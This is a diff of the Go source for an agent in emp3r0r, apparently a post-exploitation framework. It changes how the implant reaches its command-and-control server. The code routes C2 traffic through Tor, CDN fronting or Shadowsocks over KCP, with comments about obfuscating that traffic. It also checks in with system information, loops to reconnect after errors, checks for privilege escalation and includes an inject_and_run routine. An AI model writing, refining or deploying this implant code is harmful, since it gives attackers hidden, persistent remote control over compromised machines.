@@ -141,7 +141,7 @@ test_agent:
 		}
 
 		// exit, leave the existing agent instance running
-		if agent.IsAgentAlive() {
+		if isAgentAlive() {
 			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
 				log.Println("Escalating privilege...")
 			} else if !*replace {
@@ -170,9 +170,10 @@ test_agent:
 
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
+		// if CC is on Tor, CCPort won't be used since Tor handles forwarding
+		// by default we use 443, so configure your torrc accordingly
 		emp3r0r_data.CCAddress = fmt.Sprintf("%s/", emp3r0r_data.CCAddress)
 		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
-		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
 		agent.RuntimeConfig.AgentProxy = *c2proxy
 		if *c2proxy == "" {
 			agent.RuntimeConfig.AgentProxy = "socks5://127.0.0.1:9050"
@@ -180,6 +181,7 @@ test_agent:
 		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.AgentProxy)
 	} else {
 		// parse C2 address
+		// append CCPort to CCAddress
 		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, agent.RuntimeConfig.CCPort)
 	}
 	log.Printf("CCAddress is: %s", emp3r0r_data.CCAddress)
@@ -226,7 +228,6 @@ test_agent:
 				}
 			}
 		}()
-		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", agent.RuntimeConfig.CDNProxy)
 		agent.RuntimeConfig.AgentProxy = cdnproxyAddr
 	}
 
@@ -251,16 +252,10 @@ test_agent:
 					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
 					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
 						agent.RuntimeConfig.ShadowsocksPort)
-					emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s)", agent.RuntimeConfig.ShadowsocksPort)
-
-					// ss thru KCP, set C2 transport
-					if agent.RuntimeConfig.UseKCP {
-						emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s)",
-							agent.RuntimeConfig.ShadowsocksPort, agent.RuntimeConfig.KCPPort)
-					}
 
 					// run ss w/wo KCP
 					go agent.ShadowsocksC2Client()
+					go agent.KCPClient() // KCP client will run when UseKCP is set
 				}
 			}
 			return true
@@ -305,6 +300,7 @@ test_agent:
 	}
 
 connect:
+
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
 		agent.RuntimeConfig.CCIndicator != "" &&
@@ -319,12 +315,13 @@ connect:
 			goto connect
 		}
 	}
+	log.Printf("Checking in on %s", emp3r0r_data.CCAddress)
 
 	// check in with system info
 	err = agent.CheckIn()
 	if err != nil {
-		log.Println("CheckIn: ", err)
-		time.Sleep(5 * time.Second)
+		log.Printf("CheckIn error: %v, sleeping, will retry later", err)
+		util.TakeASnap()
 		goto connect
 	}
 	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)
@@ -334,18 +331,14 @@ connect:
 	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
 	emp3r0r_data.H2Json = conn
 	if err != nil {
-		log.Println("ConnectCC: ", err)
-		time.Sleep(5 * time.Second)
+		log.Printf("Connect CC failed: %v, sleeping, will retry later", err)
+		util.TakeASnap()
 		goto connect
 	}
+	emp3r0r_data.KCPKeep = true
 	log.Println("Connected to CC TunAPI")
-	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath + "/bettercap") {
-		go agent.VaccineHandler()
-	}
-	err = agent.CCMsgTun(ctx, cancel)
-	if err != nil {
-		log.Printf("CCMsgTun: %v, reconnecting...", err)
-	}
+	agent.CCMsgTun(ctx, cancel)
+	log.Printf("CCMsgTun closed, reconnecting")
 	goto connect
 }
 
@@ -354,7 +347,7 @@ func socketListen() {
 	// if socket file exists
 	if util.IsFileExist(agent.RuntimeConfig.SocketName) {
 		log.Printf("%s exists, testing connection...", agent.RuntimeConfig.SocketName)
-		if agent.IsAgentAlive() {
+		if isAgentAlive() {
 			log.Fatalf("%s exists, and agent is alive, aborting", agent.RuntimeConfig.SocketName)
 		}
 		err := os.Remove(agent.RuntimeConfig.SocketName)
@@ -432,4 +425,13 @@ func inject_and_run() (err error) {
 	}
 
 	return
+}
+
+func isAgentAlive() bool {
+	conn, err := net.Dial("unix", agent.RuntimeConfig.SocketName)
+	if err != nil {
+		log.Printf("Agent seems dead: %v", err)
+		return false
+	}
+	return agent.IsAgentAlive(conn)
 }
